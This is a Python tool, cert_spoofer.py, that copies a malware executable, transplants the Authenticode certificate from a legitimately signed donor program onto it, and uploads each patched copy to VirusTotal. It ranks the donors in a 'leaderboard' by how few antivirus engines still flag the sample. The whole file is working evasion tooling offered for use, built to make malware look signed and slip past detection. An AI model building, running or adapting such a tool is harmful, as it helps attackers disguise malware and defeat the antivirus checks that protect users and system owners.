#!/usr/bin/env python3
"""
cert_spoofer.py — Certificate transplant + VirusTotal detection leaderboard
============================================================================
Usage:
  Single certificate mode:
    python cert_spoofer.py --malware evil.exe --cert signed.exe

  Leaderboard mode (folder of signed EXEs):
    python cert_spoofer.py --malware evil.exe --cert-dir ./signed_bins/

  Skip VT upload (analysis only):
    python cert_spoofer.py --malware evil.exe --cert signed.exe --no-upload

Requires:
  VIRUSTOTAL_API_KEY in environment or .env file
"""

import os
import sys
import time
import shutil
import hashlib
import argparse
import tempfile
import json
import subprocess
import requests
from pathlib import Path
from typing import Optional
from datetime import datetime
from colorama import Fore, Style, init as colorama_init
from tabulate import tabulate
from dotenv import load_dotenv

load_dotenv()
colorama_init(autoreset=True)

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW
CYAN   = Fore.CYAN
BOLD   = Style.BRIGHT
RESET  = Style.RESET_ALL
HAS_TABULATE = True


# ── import your existing analyzer ──────────────────────────────────────────
sys.path.insert(0, str(Path(__file__).parent))
from file_analyzer import EXEAnalyzer, WrongFileType, CertificateError


# ═══════════════════════════════════════════════════════════════════════════
# PE helpers  (fixes to file_analyzer bugs + extra utilities)
# ═══════════════════════════════════════════════════════════════════════════

def strip_certificate(src: str, dst: str) -> str:
    """
    Copy src → dst, then strip the Authenticode certificate from dst.
    Returns dst path. Raises CertificateError if src is not signed.
    """
    shutil.copy2(src, dst)
    analyzer = EXEAnalyzer(dst)
    if not analyzer.is_signed():
        raise CertificateError(f"{src} has no certificate to strip.")
    analyzer.remove_certificate()
    print(f"{GREEN}[+]{RESET} Certificate stripped from {Path(src).name} → {Path(dst).name}")
    return dst


def transplant_certificate(donor_exe: str, malware_path: str, output_path: str) -> str:
    """
    1. Copy malware → output_path  (we never touch the originals)
    2. Strip output_path's cert if it already has one
    3. Transplant the donor's certificate onto output_path
    Returns output_path.
    """
    shutil.copy2(malware_path, output_path)

    # Make sure the target is clean before writing
    target_analyzer = EXEAnalyzer(output_path)
    if target_analyzer.is_signed():
        target_analyzer.remove_certificate()

    donor = EXEAnalyzer(donor_exe)
    if not donor.is_signed():
        raise CertificateError(f"Donor {donor_exe} has no certificate.")

    donor.write_certificate(output_path)
    print(f"{GREEN}[+]{RESET} Certificate from {BOLD}{Path(donor_exe).name}{RESET} "
          f"transplanted onto {BOLD}{Path(output_path).name}{RESET}")
    return output_path


def sha256_of(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def cert_subject(exe_path: str) -> str:
    """
    Best-effort: extract the signer CN from the embedded certificate.
    Uses openssl if available, otherwise returns a hex fingerprint.
    """
    try:
        analyzer = EXEAnalyzer(exe_path)
        if not analyzer.is_signed():
            return "unsigned"
        raw_cert = analyzer.get_certificate()
        # WIN_CERT structure: dwLength(4) + wRevision(2) + wCertType(2) + bCertificate
        cert_data = raw_cert[8:]
        with tempfile.NamedTemporaryFile(suffix=".der", delete=False) as tmp:
            tmp.write(cert_data)
            tmp_path = tmp.name
        result = subprocess.run(
            ["openssl", "pkcs7", "-inform", "DER", "-print_certs", "-noout", "-text",
             "-in", tmp_path],
            capture_output=True, text=True, timeout=5
        )
        os.unlink(tmp_path)
        for line in result.stdout.splitlines():
            if "Subject:" in line and "CN=" in line:
                cn_part = [p for p in line.split(",") if "CN=" in p]
                if cn_part:
                    return cn_part[0].strip().replace("CN=", "")
    except Exception:
        pass
    # Fallback: partial SHA256 of the cert bytes
    try:
        raw = EXEAnalyzer(exe_path).get_certificate()
        return "cert-" + hashlib.sha256(raw).hexdigest()[:12]
    except Exception:
        return "unknown"


# ═══════════════════════════════════════════════════════════════════════════
# VirusTotal API
# ═══════════════════════════════════════════════════════════════════════════

VT_BASE = "https://www.virustotal.com/api/v3"


class VirusTotalClient:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.headers = {"x-apikey": api_key}

    # ── upload ──────────────────────────────────────────────────────────────
    def upload_file(self, filepath: str) -> str:
        """Upload file, return analysis id."""
        size = os.path.getsize(filepath)
        if size > 32 * 1024 * 1024:          # >32 MB → large file upload
            url_resp = requests.get(
                f"{VT_BASE}/files/upload_url", headers=self.headers, timeout=30
            )
            url_resp.raise_for_status()
            upload_url = url_resp.json()["data"]
        else:
            upload_url = f"{VT_BASE}/files"

        with open(filepath, "rb") as fh:
            resp = requests.post(
                upload_url,
                headers=self.headers,
                files={"file": (Path(filepath).name, fh)},
                timeout=120,
            )
        resp.raise_for_status()
        analysis_id = resp.json()["data"]["id"]
        print(f"{CYAN}[VT]{RESET} Uploaded → analysis id: {analysis_id}")
        return analysis_id

    # ── check hash first (avoid re-uploading) ───────────────────────────────
    def lookup_hash(self, sha256: str) -> Optional[dict]:
        resp = requests.get(
            f"{VT_BASE}/files/{sha256}", headers=self.headers, timeout=30
        )
        if resp.status_code == 404:
            return None
        resp.raise_for_status()
        return resp.json()

    # ── poll analysis ────────────────────────────────────────────────────────
    def wait_for_analysis(
        self, analysis_id: str, poll_interval: int = 15, max_wait: int = 300
    ) -> dict:
        url = f"{VT_BASE}/analyses/{analysis_id}"
        elapsed = 0
        while elapsed < max_wait:
            resp = requests.get(url, headers=self.headers, timeout=30)
            resp.raise_for_status()
            data = resp.json()
            status = data["data"]["attributes"]["status"]
            if status == "completed":
                return data
            print(f"{YELLOW}[VT]{RESET} Status: {status} — waiting {poll_interval}s …")
            time.sleep(poll_interval)
            elapsed += poll_interval
        raise TimeoutError(f"VT analysis did not complete within {max_wait}s")

    # ── parse results ────────────────────────────────────────────────────────
    @staticmethod
    def parse_results(vt_data: dict) -> dict:
        """
        Returns:
          {
            "total":     int,
            "detected":  int,
            "engines":   { engine_name: {"category": str, "result": str} }
          }
        """
        attrs = (
            vt_data.get("data", {})
                   .get("attributes", {})
        )
        # Analysis endpoint returns stats directly
        stats = attrs.get("stats", {})
        results = attrs.get("results", {})

        # File endpoint has last_analysis_stats / last_analysis_results
        if not stats:
            stats   = attrs.get("last_analysis_stats", {})
            results = attrs.get("last_analysis_results", {})

        detected  = stats.get("malicious", 0) + stats.get("suspicious", 0)
        total     = sum(stats.values())
        engines   = {
            name: {
                "category": info.get("category", ""),
                "result":   info.get("result") or "",
            }
            for name, info in results.items()
        }
        return {"total": total, "detected": detected, "engines": engines}

    # ── full scan pipeline ───────────────────────────────────────────────────
    def scan(self, filepath: str, force_upload: bool = False) -> dict:
        sha = sha256_of(filepath)
        print(f"{CYAN}[VT]{RESET} SHA256: {sha}")

        # Try cache first
        if not force_upload:
            cached = self.lookup_hash(sha)
            if cached:
                print(f"{GREEN}[VT]{RESET} Hash already in VT — using cached results.")
                return self.parse_results(cached)

        analysis_id = self.upload_file(filepath)
        raw = self.wait_for_analysis(analysis_id)
        return self.parse_results(raw)


# ═══════════════════════════════════════════════════════════════════════════
# Display helpers
# ═══════════════════════════════════════════════════════════════════════════

def print_detection_report(label: str, result: dict) -> None:
    detected = result["detected"]
    total    = result["total"]
    ratio    = f"{detected}/{total}"
    color    = RED if detected > 0 else GREEN

    print(f"\n{'─'*60}")
    print(f"  {BOLD}{label}{RESET}")
    print(f"  Detections: {color}{BOLD}{ratio}{RESET}")
    print(f"{'─'*60}")

    flagging = {
        name: info for name, info in result["engines"].items()
        if info["category"] in ("malicious", "suspicious")
    }
    if flagging:
        rows = [
            [name, info["category"].upper(), info["result"]]
            for name, info in sorted(flagging.items())
        ]
        if HAS_TABULATE:
            print(tabulate(rows, headers=["Engine", "Category", "Signature"], tablefmt="simple"))
        else:
            for name, cat, sig in rows:
                print(f"  {RED}{name:<30}{RESET}  {cat:<12}  {sig}")
    else:
        print(f"  {GREEN}No detections.{RESET}")


def print_leaderboard(entries: list[dict]) -> None:
    """
    entries: list of { "donor": str, "subject": str,
                        "detected": int, "total": int, "output": str }
    Sorted ascending by detected count.
    """
    entries.sort(key=lambda x: x["detected"])

    print(f"\n{'═'*70}")
    print(f"  {BOLD}{CYAN}  🏆  CERTIFICATE LEADERBOARD  (fewer detections = better){RESET}")
    print(f"{'═'*70}")

    rows = []
    for rank, e in enumerate(entries, 1):
        medal = {1: "🥇", 2: "🥈", 3: "🥉"}.get(rank, f"#{rank}")
        ratio = f"{e['detected']}/{e['total']}"
        color = GREEN if e["detected"] == 0 else (YELLOW if e["detected"] < 5 else RED)
        rows.append([
            medal,
            Path(e["donor"]).name,
            e["subject"],
            f"{color}{ratio}{RESET}",
            e["detected"],
        ])

    if HAS_TABULATE:
        print(tabulate(
            rows,
            headers=["Rank", "Donor EXE", "Cert Subject (CN)", "Detections", "Raw #"],
            tablefmt="rounded_outline"
        ))
    else:
        print(f"{'Rank':<6} {'Donor EXE':<30} {'Detections':<12}")
        for r in rows:
            print(f"{r[0]:<6} {r[1]:<30} {r[3]:<12}")

    print(f"\n{GREEN}{BOLD}  Winner: {entries[0]['donor']} "
          f"({entries[0]['detected']}/{entries[0]['total']} detections){RESET}\n")


def save_report(entries: list[dict], malware_path: str, out_dir: str) -> None:
    report = {
        "timestamp":      datetime.utcnow().isoformat() + "Z",
        "malware_sample": malware_path,
        "leaderboard":    [
            {
                "rank":      i + 1,
                "donor_exe": e["donor"],
                "cert_cn":   e["subject"],
                "detected":  e["detected"],
                "total":     e["total"],
                "output":    e["output"],
            }
            for i, e in enumerate(entries)
        ],
    }
    report_path = Path(out_dir) / f"report_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    report_path.write_text(json.dumps(report, indent=2))
    print(f"\n{CYAN}[*]{RESET} Full report saved → {report_path}")


# ═══════════════════════════════════════════════════════════════════════════
# Core workflow
# ═══════════════════════════════════════════════════════════════════════════

def single_mode(args, vt: Optional[VirusTotalClient]) -> None:
    """Transplant one certificate and scan."""
    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    output_name = out_dir / f"patched_{Path(args.malware).name}"
    transplant_certificate(args.cert, args.malware, str(output_name))

    if vt and not args.no_upload:
        result = vt.scan(str(output_name))
        print_detection_report(str(output_name), result)
    else:
        print(f"\n{YELLOW}[!]{RESET} VT scanning skipped (--no-upload or no API key).")
        print(f"    Output file ready: {output_name}")


def leaderboard_mode(args, vt: Optional[VirusTotalClient]) -> None:
    """Try every signed EXE in cert_dir as a donor, build leaderboard."""
    cert_dir = Path(args.cert_dir)
    out_dir  = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    donors = [
        f for f in cert_dir.iterdir()
        if f.suffix.lower() == ".exe"
    ]
    if not donors:
        print(f"{RED}[!]{RESET} No .exe files found in {cert_dir}")
        sys.exit(1)

    print(f"\n{CYAN}[*]{RESET} Found {len(donors)} donor(s) in {cert_dir}")

    entries = []

    for i, donor_path in enumerate(donors, 1):
        print(f"\n{BOLD}[{i}/{len(donors)}] Processing donor: {donor_path.name}{RESET}")

        # ── check donor is signed ────────────────────────────────────────
        try:
            donor_analyzer = EXEAnalyzer(str(donor_path))
        except WrongFileType:
            print(f"  {YELLOW}[!]{RESET} Not a PE — skipping.")
            continue

        if not donor_analyzer.is_signed():
            print(f"  {YELLOW}[!]{RESET} No certificate — skipping.")
            continue

        # ── transplant ──────────────────────────────────────────────────
        safe_name = donor_path.stem.replace(" ", "_")
        output_path = out_dir / f"patched_{safe_name}_{Path(args.malware).name}"
        try:
            transplant_certificate(str(donor_path), args.malware, str(output_path))
        except CertificateError as e:
            print(f"  {RED}[!]{RESET} Transplant failed: {e}")
            continue

        subject = cert_subject(str(donor_path))

        # ── scan ────────────────────────────────────────────────────────
        if vt and not args.no_upload:
            try:
                result = vt.scan(str(output_path))
                print_detection_report(donor_path.name, result)
                entries.append({
                    "donor":    str(donor_path),
                    "subject":  subject,
                    "detected": result["detected"],
                    "total":    result["total"],
                    "output":   str(output_path),
                    "engines":  result["engines"],
                })
            except Exception as e:
                print(f"  {RED}[!]{RESET} VT scan failed: {e}")
        else:
            # No VT — still record with 0/0 so file is produced
            entries.append({
                "donor":    str(donor_path),
                "subject":  subject,
                "detected": 0,
                "total":    0,
                "output":   str(output_path),
                "engines":  {},
            })

        # VT free tier: 4 req/min
        if vt and not args.no_upload and i < len(donors):
            wait = args.vt_delay
            print(f"  {YELLOW}[*]{RESET} Waiting {wait}s before next upload (VT rate limit)…")
            time.sleep(wait)

    if not entries:
        print(f"\n{RED}[!]{RESET} No valid donors processed.")
        return

    print_leaderboard(entries)
    save_report(entries, args.malware, str(out_dir))


# ═══════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Certificate transplant + VirusTotal detection leaderboard",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--malware",    required=True,
                        help="Target malware EXE to receive the certificate")
    parser.add_argument("--cert",       default=None,
                        help="Single donor EXE to strip cert from (single mode)")
    parser.add_argument("--cert-dir",   default=None,
                        help="Folder of signed EXEs (leaderboard mode)")
    parser.add_argument("--output-dir", default="./output",
                        help="Where to write patched files (default: ./output)")
    parser.add_argument("--no-upload",  action="store_true",
                        help="Skip VirusTotal upload (just produce patched files)")
    parser.add_argument("--force-upload", action="store_true",
                        help="Re-upload even if hash already exists in VT")
    parser.add_argument("--vt-delay",  type=int, default=20,
                        help="Seconds to wait between VT uploads (default: 20)")
    parser.add_argument("--api-key",   default=None,
                        help="VT API key (overrides VIRUSTOTAL_API_KEY env var)")
    args = parser.parse_args()

    # ── validate args ───────────────────────────────────────────────────────
    if not args.cert and not args.cert_dir:
        parser.error("Provide --cert (single) or --cert-dir (leaderboard).")
    if args.cert and args.cert_dir:
        parser.error("Provide --cert or --cert-dir, not both.")
    if not Path(args.malware).is_file():
        parser.error(f"Malware file not found: {args.malware}")

    # ── VT client ───────────────────────────────────────────────────────────
    api_key = args.api_key or os.environ.get("VIRUSTOTAL_API_KEY")
    vt = None
    if api_key:
        vt = VirusTotalClient(api_key)
        print(f"{GREEN}[*]{RESET} VirusTotal API key loaded.")
    else:
        print(f"{YELLOW}[!]{RESET} No VIRUSTOTAL_API_KEY found — VT scanning disabled.")
        args.no_upload = True

    # ── run ─────────────────────────────────────────────────────────────────
    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"  {BOLD}cert_spoofer.py{RESET}  |  target: {BOLD}{args.malware}{RESET}")
    print(f"{'═'*60}")

    if args.cert:
        single_mode(args, vt)
    else:
        leaderboard_mode(args, vt)


if __name__ == "__main__":
    main()
